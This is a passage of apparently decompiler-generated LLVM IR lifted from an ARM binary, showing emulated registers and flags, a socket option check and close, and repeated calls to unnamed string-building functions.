  br i1 %v7_9588, label %dec_label_pc_a374, label %dec_label_pc_9590

dec_label_pc_9590:                                ; preds = %dec_label_pc_a268, %dec_label_pc_a6a8, %dec_label_pc_a7f0, %dec_label_pc_a66c, %dec_label_pc_9588, %dec_label_pc_954c, %dec_label_pc_95b0, %dec_label_pc_aadc, %dec_label_pc_a88c, %dec_label_pc_a7d4, %dec_label_pc_a68c, %dec_label_pc_a654, %dec_label_pc_a5dc, %dec_label_pc_a3b4, %dec_label_pc_9634, %dec_label_pc_a158
  %stack_var_-40.6 = phi i32 [ %stack_var_-40.7, %dec_label_pc_95b0 ], [ %stack_var_-40.7, %dec_label_pc_954c ], [ %stack_var_-40.7, %dec_label_pc_a7d4 ], [ %stack_var_-40.7, %dec_label_pc_a66c ], [ %stack_var_-40.21, %dec_label_pc_a654 ], [ %stack_var_-40.20, %dec_label_pc_a5dc ], [ %stack_var_-40.15, %dec_label_pc_a158 ], [ %stack_var_-40.7, %dec_label_pc_a68c ], [ %stack_var_-40.7, %dec_label_pc_a6a8 ], [ %stack_var_-40.7, %dec_label_pc_aadc ], [ %stack_var_-40.7, %dec_label_pc_a88c ], [ %stack_var_-40.7, %dec_label_pc_a3b4 ], [ %stack_var_-40.7, %dec_label_pc_a7f0 ], [ %stack_var_-40.7, %dec_label_pc_9588 ], [ %stack_var_-40.7, %dec_label_pc_9634 ], [ %stack_var_-40.7, %dec_label_pc_a268 ]
  store i32 %v0_90f4, i32* %r3.global-to-local, align 4
  %v1_9598 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_9598, i32* %r2.global-to-local, align 4
  %v0_959c = load i32, i32* @r8, align 4
  %v2_95a0 = sub i32 %v1_9598, %v0_90f4
  %v3_95a0 = icmp uge i32 %v1_9598, %v0_90f4
  store i1 %v3_95a0, i1* %cpsr_c.global-to-local, align 1
  %v4_95a0 = xor i32 %v1_9598, %v0_90f4
  %v5_95a0 = xor i32 %v2_95a0, %v1_9598
  %v6_95a0 = and i32 %v5_95a0, %v4_95a0
  %v7_95a0 = icmp slt i32 %v6_95a0, 0
  store i1 %v7_95a0, i1* %cpsr_v.global-to-local, align 1
  %v8_95a0 = icmp slt i32 %v2_95a0, 0
  store i1 %v8_95a0, i1* %cpsr_n.global-to-local, align 1
  %v9_95a0 = icmp eq i32 %v1_9598, %v0_90f4
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = add i32 %v0_959c, 3140
  store i32 %v1_95a8, i32* @r8, align 4
  br i1 %v9_95a0, label %dec_label_pc_9280.outer, label %dec_label_pc_95b0

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9590, %dec_label_pc_9540
  %v0_95b8 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_9540 ], [ %v1_95a8, %dec_label_pc_9590 ]
  %stack_var_-20832.0 = phi i32 [ %v1_9534, %dec_label_pc_9540 ], [ %v1_9598, %dec_label_pc_9590 ]
  %stack_var_-40.7 = phi i32 [ %stack_var_-40.5, %dec_label_pc_9540 ], [ %stack_var_-40.6, %dec_label_pc_9590 ]
  %v1_95b0 = add i32 %v0_95b8, -1456
  %v2_95b0 = inttoptr i32 %v1_95b0 to i32*
  %v3_95b0 = load i32, i32* %v2_95b0, align 4
  store i32 %v3_95b0, i32* %r0.global-to-local, align 4
  %v1_95b4 = add i32 %v3_95b0, 1
  %v2_95b4 = icmp eq i32 %v3_95b0, -1
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v3_95b4 = sub i32 0, %v3_95b0
  %v4_95b4 = and i32 %v1_95b4, %v3_95b4
  %v5_95b4 = icmp slt i32 %v4_95b4, 0
  store i1 %v5_95b4, i1* %cpsr_v.global-to-local, align 1
  %v6_95b4 = icmp slt i32 %v1_95b4, 0
  store i1 %v6_95b4, i1* %cpsr_n.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v1_95b4, 0
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_95b0, i32* %sb.global-to-local, align 4
  br i1 %v7_95b4, label %dec_label_pc_9590, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b0
  %v3_95c0 = udiv i32 %v3_95b0, 32
  %v3_95c8 = mul nuw nsw i32 %v3_95c0, 4
  store i32 %v2_9a54, i32* %lr.global-to-local, align 4
  %v2_95d0 = add i32 %v3_95c8, %v2_9a54
  store i32 %v2_95d0, i32* %r3.global-to-local, align 4
  %v1_95d4 = add i32 %v2_95d0, -292
  %v2_95d4 = inttoptr i32 %v1_95d4 to i32*
  %v3_95d4 = load i32, i32* %v2_95d4, align 4
  %v1_95d8 = urem i32 %v3_95b0, 32
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  %v2_95dc = add nsw i32 %v1_95d8, -1
  %v3_95dc = shl i32 1, %v2_95dc
  %v4_95dc = and i32 %v3_95d4, %v3_95dc
  %v5_95dc = icmp ne i32 %v4_95dc, 0
  store i1 %v5_95dc, i1* %cpsr_c.global-to-local, align 1
  %v6_95dc = lshr i32 %v3_95d4, %v1_95d8
  store i32 %v6_95dc, i32* %r2.global-to-local, align 4
  %v1_95e0 = urem i32 %v6_95dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_95e0 = icmp eq i32 %v1_95e0, 0
  store i1 %v2_95e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95e0, label %dec_label_pc_954c, label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95c0
  store i32 4, i32* @r4, align 4
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_9600, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_960c, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v7_9618 = call i32 @getsockopt(i32 %v3_95b0, i32 1, i32 4, i32* nonnull %stack_var_-44, i32* nonnull %stack_var_-48)
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9620 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9620, i32* %r3.global-to-local, align 4
  %v2_9624 = or i32 %v3_9620, %v7_9618
  store i32 %v2_9624, i32* %r0.global-to-local, align 4
  %v3_9624 = icmp slt i32 %v2_9624, 0
  store i1 %v3_9624, i1* %cpsr_n.global-to-local, align 1
  %v4_9624 = icmp eq i32 %v2_9624, 0
  store i1 %v4_9624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_9624, label %.thread36, label %dec_label_pc_9634

.thread36:                                        ; preds = %dec_label_pc_95e8
  %v1_9628 = load i32, i32* @r8, align 4
  %v2_9628 = add i32 %v1_9628, -1456
  %v3_9628 = inttoptr i32 %v2_9628 to i32*
  %v4_9628 = load i32, i32* %v3_9628, align 4
  store i32 %v4_9628, i32* %r0.global-to-local, align 4
  %v1_962c = load i32, i32* @r4, align 4
  %v2_962c = trunc i32 %v1_962c to i8
  %v4_962c = add i32 %v1_9628, -1452
  %v5_962c = inttoptr i32 %v4_962c to i8*
  store i8 %v2_962c, i8* %v5_962c, align 1
  %v0_9630.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9630.pr.pr, label %.thread36.dec_label_pc_954c_crit_edge, label %dec_label_pc_9634

.thread36.dec_label_pc_954c_crit_edge:            ; preds = %.thread36
  %v0_954c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_954c

dec_label_pc_9634:                                ; preds = %dec_label_pc_95e8, %.thread36
  %v0_9634 = load i32, i32* @r8, align 4
  %v1_9634 = add i32 %v0_9634, -1456
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  %v1_9638 = call i32 @close(i32 %v3_9634)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_9640 = load i32, i32* @r8, align 4
  %v2_9640 = add i32 %v1_9640, -1456
  %v3_9640 = inttoptr i32 %v2_9640 to i32*
  store i32 -1, i32* %v3_9640, align 4
  %v0_9644 = load i32, i32* @r5, align 4
  %v1_9644 = trunc i32 %v0_9644 to i8
  %v2_9644 = load i32, i32* @r8, align 4
  %v3_9644 = add i32 %v2_9644, -1452
  %v4_9644 = inttoptr i32 %v3_9644 to i8*
  store i8 %v1_9644, i8* %v4_9644, align 1
  br label %dec_label_pc_9590

dec_label_pc_964c:                                ; preds = %dec_label_pc_93a8
  %v1_964c = add i32 %v3_9658, 25
  %v2_964c = inttoptr i32 %v1_964c to i32*
  %v3_964c = load i32, i32* %v2_964c, align 4
  store i32 %v3_964c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9650 = icmp slt i32 %v3_964c, 0
  store i1 %v1_9650, i1* %cpsr_n.global-to-local, align 1
  %v2_9650 = icmp eq i32 %v3_964c, 0
  store i1 %v2_9650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9650, label %.thread41, label %.thread39

.thread39:                                        ; preds = %dec_label_pc_964c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_93a8, align 1
  %v0_965c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_965c.pr.pr, label %.thread39..thread41_crit_edge, label %dec_label_pc_9664

.thread39..thread41_crit_edge:                    ; preds = %.thread39
  %v1_965c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_965c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_965c.pre to i8
  br label %.thread41

.thread41:                                        ; preds = %.thread39..thread41_crit_edge, %dec_label_pc_964c
  %v3_965c = phi i32 [ %v3_965c.pre, %.thread39..thread41_crit_edge ], [ %v3_9658, %dec_label_pc_964c ]
  %v1_965c.off0 = phi i8 [ %extract.t, %.thread39..thread41_crit_edge ], [ 0, %dec_label_pc_964c ]
  %v4_965c = add i32 %v3_965c, -1427
  %v5_965c = inttoptr i32 %v4_965c to i8*
  store i8 %v1_965c.off0, i8* %v5_965c, align 1
  %v0_9660.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9660.pr, label %.thread41.dec_label_pc_93bc_crit_edge, label %dec_label_pc_9664

.thread41.dec_label_pc_93bc_crit_edge:            ; preds = %.thread41
  %v0_93bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_93bc

dec_label_pc_9664:                                ; preds = %.thread39, %.thread41, %dec_label_pc_9318
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_966c = load i32, i32* @r7, align 4
  %v1_966c = add i32 %v0_966c, 2112
  store i32 %v1_966c, i32* %r0.global-to-local, align 4
  %v1_9670 = load i32, i32* @r6, align 4
  %v2_9670 = add i32 %v1_9670, 33
  %v3_9670 = inttoptr i32 %v2_9670 to i32*
  store i32 -1, i32* %v3_9670, align 4
  %v0_9674 = load i32, i32* %r0.global-to-local, align 4
  %v1_9674 = add i32 %v0_9674, 4
  store i32 %v1_9674, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_967c = load i32, i32* @r5, align 4
  %v1_967c = load i32, i32* @r6, align 4
  %v2_967c = add i32 %v1_967c, 21
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v0_967c, i32* %v3_967c, align 4
  %v2_9680 = call i32 @function_13aa8(i32 %v1_9674, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_968c = load i32, i32* @r5, align 4
  %v1_968c = load i32, i32* @r6, align 4
  %v2_968c = add i32 %v1_968c, 681
  %v3_968c = inttoptr i32 %v2_968c to i32*
  store i32 %v0_968c, i32* %v3_968c, align 4
  %v2_9690 = call i32 @function_13aa8(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9698 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_96a0 = load i32, i32* @r6, align 4
  store i32 %v0_96a0, i32* %r1.global-to-local, align 4
  %v2_96a4 = add i32 %v2_9698, %stack_var_-20856.0.ph
  store i32 %v2_96a4, i32* @r0, align 4
  %v2_96a8 = inttoptr i32 %v2_96a4 to i8*
  %v3_96a8 = call i32 @function_13a30(i8* %v2_96a8, i32 %v0_96a0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96b0 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14360.83 to i32), i32* %r1.global-to-local, align 4
  %v2_96bc = add i32 %v2_96b0, %stack_var_-20856.0.ph
  store i32 %v2_96bc, i32* @r0, align 4
  %v2_96c0 = inttoptr i32 %v2_96bc to i8*
  %v3_96c0 = call i32 @function_13a30(i8* %v2_96c0, i32 ptrtoint (i32* @global_var_14360.83 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96c8 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r7, align 4
  %v1_96d0 = add i32 %v0_96d0, 532
  store i32 %v1_96d0, i32* %r1.global-to-local, align 4
  %v2_96d4 = add i32 %v2_96c8, %stack_var_-20856.0.ph
  store i32 %v2_96d4, i32* @r0, align 4
  %v2_96d8 = inttoptr i32 %v2_96d4 to i8*
  %v3_96d8 = call i32 @function_13a30(i8* %v2_96d8, i32 %v1_96d0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96e0 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_14338.85 to i32), i32* %r1.global-to-local, align 4
  %v2_96ec = add i32 %v2_96e0, %stack_var_-20856.0.ph
  store i32 %v2_96ec, i32* @r0, align 4
  %v3_96f0 = inttoptr i32 %v2_96ec to i8*
  %v4_96f0 = call i32 @function_13a30(i8* %v3_96f0, i32 ptrtoint ([24 x i8]* @global_var_14338.85 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96f8 = call i32 @function_13a08(i8* %v1_9698)
  %v2_9700 = add i32 %v2_96f8, %stack_var_-20856.0.ph
  store i32 %v2_9700, i32* @r0, align 4
  %v0_9704 = load i32, i32* @r7, align 4
  %v1_9704 = add i32 %v0_9704, 20
  store i32 %v1_9704, i32* %r1.global-to-local, align 4
  %v2_9708 = inttoptr i32 %v2_9700 to i8*
  %v3_9708 = call i32 @function_13a30(i8* %v2_9708, i32 %v1_9704)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9710 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14350.87 to i32), i32* %r1.global-to-local, align 4
  %v2_971c = add i32 %v2_9710, %stack_var_-20856.0.ph
  store i32 %v2_971c, i32* @r0, align 4
  %v3_9720 = inttoptr i32 %v2_971c to i8*
  %v4_9720 = call i32 @function_13a30(i8* %v3_9720, i32 ptrtoint ([9 x i8]* @global_var_14350.87 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9728 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_9730 = load i32, i32* @r7, align 4
  %v2_9734 = add i32 %v2_9728, %stack_var_-20856.0.ph
  store i32 %v2_9734, i32* @r0, align 4
  %v1_9738 = add i32 %v0_9730, 789
  store i32 %v1_9738, i32* %r1.global-to-local, align 4
  %v2_973c = inttoptr i32 %v2_9734 to i8*
  %v3_973c = call i32 @function_13a30(i8* %v2_973c, i32 %v1_9738)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9744 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_9750 = add i32 %v2_9744, %stack_var_-20856.0.ph
  store i32 %v2_9750, i32* @r0, align 4
  %v3_9754 = inttoptr i32 %v2_9750 to i8*
  %v4_9754 = call i32 @function_13a30(i8* %v3_9754, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_975c = call i32 @function_130e4(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9764 = call i32 @function_13a08(i8* %v1_9698)
  %v0_9768 = load i32, i32* @r5, align 4
  store i32 %v0_9768, i32* %r1.global-to-local, align 4
  store i32 %v2_9764, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_9774 = inttoptr i32 %v0_9768 to i32*
  %v3_9774 = call i32 @function_13000(i32 32, i32* %v2_9774)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_9774, i32* %r1.global-to-local, align 4
  %v1_9780 = load i32, i32* @r4, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-20856.0.ph
  store i32 %v2_9780, i32* @r0, align 4
  %v2_9784 = inttoptr i32 %v2_9780 to i8*
  %v3_9784 = call i32 @function_13a30(i8* %v2_9784, i32 %v3_9774)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_978c = call i32 @function_1302c(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9794 = call i32 @function_13a08(i8* %v1_9698)
  %v2_979c = add i32 %v2_9794, %stack_var_-20856.0.ph
  store i32 %v2_979c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v3_97a4 = inttoptr i32 %v2_979c to i8*
  %v4_97a4 = call i32 @function_13a30(i8* %v3_97a4, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97ac = call i32 @function_130e4(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97b4 = call i32 @function_13a08(i8* %v1_9698)
  %v0_97b8 = load i32, i32* @r5, align 4
  store i32 %v0_97b8, i32* %r1.global-to-local, align 4
  store i32 %v2_97b4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_97c4 = inttoptr i32 %v0_97b8 to i32*
  %v3_97c4 = call i32 @function_13000(i32 33, i32* %v2_97c4)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_97c4, i32* %r1.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %stack_var_-20856.0.ph
  store i32 %v2_97d0, i32* @r0, align 4
  %v2_97d4 = inttoptr i32 %v2_97d0 to i8*
  %v3_97d4 = call i32 @function_13a30(i8* %v2_97d4, i32 %v3_97c4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97dc = call i32 @function_1302c(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97e4 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_97f0 = add i32 %v2_97e4, %stack_var_-20856.0.ph
  store i32 %v2_97f0, i32* @r0, align 4
  %v3_97f4 = inttoptr i32 %v2_97f0 to i8*
  %v4_97f4 = call i32 @function_13a30(i8* %v3_97f4, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_97fc = call i32 @function_130e4(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9804 = call i32 @function_13a08(i8* %v1_9698)
  %v0_9808 = load i32, i32* @r5, align 4
  store i32 %v0_9808, i32* %r1.global-to-local, align 4
  store i32 %v2_9804, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_9814 = inttoptr i32 %v0_9808 to i32*
  %v3_9814 = call i32 @function_13000(i32 34, i32* %v2_9814)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9814, i32* %r1.global-to-local, align 4
  %v1_9820 = load i32, i32* @r4, align 4
  %v2_9820 = add i32 %v1_9820, %stack_var_-20856.0.ph
  store i32 %v2_9820, i32* @r0, align 4
  %v2_9824 = inttoptr i32 %v2_9820 to i8*
  %v3_9824 = call i32 @function_13a30(i8* %v2_9824, i32 %v3_9814)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_982c = call i32 @function_1302c(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9834 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_9840 = add i32 %v2_9834, %stack_var_-20856.0.ph
  store i32 %v2_9840, i32* @r0, align 4
  %v3_9844 = inttoptr i32 %v2_9840 to i8*
  %v4_9844 = call i32 @function_13a30(i8* %v3_9844, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 %v4_9844, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v1_984c = load i32, i32* @r5, align 4
  %v2_984c = sub i32 %v6_8f58, %v1_984c
  %v3_984c = icmp uge i32 %v6_8f58, %v1_984c
  store i1 %v3_984c, i1* %cpsr_c.global-to-local, align 1
  %v4_984c = xor i32 %v1_984c, %v6_8f58
  %v5_984c = xor i32 %v2_984c, %v6_8f58
  %v6_984c = and i32 %v5_984c, %v4_984c
  %v7_984c = icmp slt i32 %v6_984c, 0
  store i1 %v7_984c, i1* %cpsr_v.global-to-local, align 1
  %v8_984c = icmp slt i32 %v2_984c, 0
  store i1 %v8_984c, i1* %cpsr_n.global-to-local, align 1
  %v9_984c = icmp eq i32 %v6_8f58, %v1_984c
  store i1 %v9_984c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_984c, label %dec_label_pc_9924, label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9664
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9858 = call i32 @function_130e4(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9860 = call i32 @function_13a08(i8* %v1_9698)
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r1.global-to-local, align 4
  store i32 %v2_9860, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_9870 = inttoptr i32 %v0_9864 to i32*
  %v3_9870 = call i32 @function_13000(i32 35, i32* %v2_9870)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9870, i32* %r1.global-to-local, align 4
  %v1_987c = load i32, i32* @r4, align 4
  %v2_987c = add i32 %v1_987c, %stack_var_-20856.0.ph
  store i32 %v2_987c, i32* @r0, align 4
  %v2_9880 = inttoptr i32 %v2_987c to i8*
  %v3_9880 = call i32 @function_13a30(i8* %v2_9880, i32 %v3_9870)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9888 = call i32 @function_1302c(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_989c = add i32 %v2_9890, %stack_var_-20856.0.ph
  store i32 %v2_989c, i32* @r0, align 4
  %v3_98a0 = inttoptr i32 %v2_989c to i8*
  %v4_98a0 = call i32 @function_13a30(i8* %v3_98a0, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98a8 = call i32 @function_13a08(i8* %v1_9698)
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* %r1.global-to-local, align 4
  store i32 %v2_98a8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_98b8 = inttoptr i32 %v0_98ac to i32*
  %v3_98b8 = call i32 @function_13000(i32 40, i32* %v2_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_98b8, i32* %r1.global-to-local, align 4
  %v2_98c4 = add i32 %v2_98a8, %stack_var_-20856.0.ph
  store i32 %v2_98c4, i32* @r0, align 4
  %v2_98c8 = inttoptr i32 %v2_98c4 to i8*
  %v3_98c8 = call i32 @function_13a30(i8* %v2_98c8, i32 %v3_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14360.83 to i32), i32* %r1.global-to-local, align 4
  %v2_98dc = add i32 %v2_98d0, %stack_var_-20856.0.ph
  store i32 %v2_98dc, i32* @r0, align 4
  %v2_98e0 = inttoptr i32 %v2_98dc to i8*
  %v3_98e0 = call i32 @function_13a30(i8* %v2_98e0, i32 ptrtoint (i32* @global_var_14360.83 to i32))
  store i32 %v6_8f58, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_13a08(i8* %v1_98e8)
  store i32 %v2_98e8, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98f4 = call i32 @function_13a08(i8* %v1_9698)
  %v2_98fc = add i32 %v2_98f4, %stack_var_-20856.0.ph
  store i32 %v2_98fc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_9904 = load i32, i32* @r4, align 4
  store i32 %v0_9904, i32* %r0.global-to-local, align 4
  %v3_9908 = trunc i32 %v0_9904 to i8
  %v4_9908 = call i32 @function_13efc(i8 %v3_9908, i32 10, i32 %v2_98fc)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9910 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_991c = add i32 %v2_9910, %stack_var_-20856.0.ph
  store i32 %v2_991c, i32* @r0, align 4
  %v3_9920 = inttoptr i32 %v2_991c to i8*
  %v4_9920 = call i32 @function_13a30(i8* %v3_9920, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 %v4_9920, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9664, %dec_label_pc_9854
  %v0_9924 = load i32, i32* @r6, align 4
  %v1_9924 = add i32 %v0_9924, 37
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  %v3_9924 = load i32, i32* %v2_9924, align 4
  store i32 %v3_9924, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9928 = icmp slt i32 %v3_9924, 0
  store i1 %v1_9928, i1* %cpsr_n.global-to-local, align 1
  %v2_9928 = icmp eq i32 %v3_9924, 0
  store i1 %v2_9928, i1* %cpsr_z.global-to-local, align 1
  %tmp206 = icmp slt i32 %v3_9924, 1
  br i1 %tmp206, label %dec_label_pc_99d0, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9924
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9934 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14370.91 to i32), i32* %r1.global-to-local, align 4
  %v2_9940 = add i32 %v2_9934, %stack_var_-20856.0.ph
  store i32 %v2_9940, i32* @r0, align 4
  %v3_9944 = inttoptr i32 %v2_9940 to i8*
  %v4_9944 = call i32 @function_13a30(i8* %v3_9944, i32 ptrtoint ([9 x i8]* @global_var_14370.91 to i32))
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  %v0_9948 = load i32, i32* @r6, align 4
  %v1_9948 = add i32 %v0_9948, 37
  %v2_9948 = inttoptr i32 %v1_9948 to i32*
  %v3_9948 = load i32, i32* %v2_9948, align 4
  store i32 %v3_9948, i32* %r3.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9950 = icmp slt i32 %v3_9948, 0
  store i1 %v1_9950, i1* %cpsr_n.global-to-local, align 1
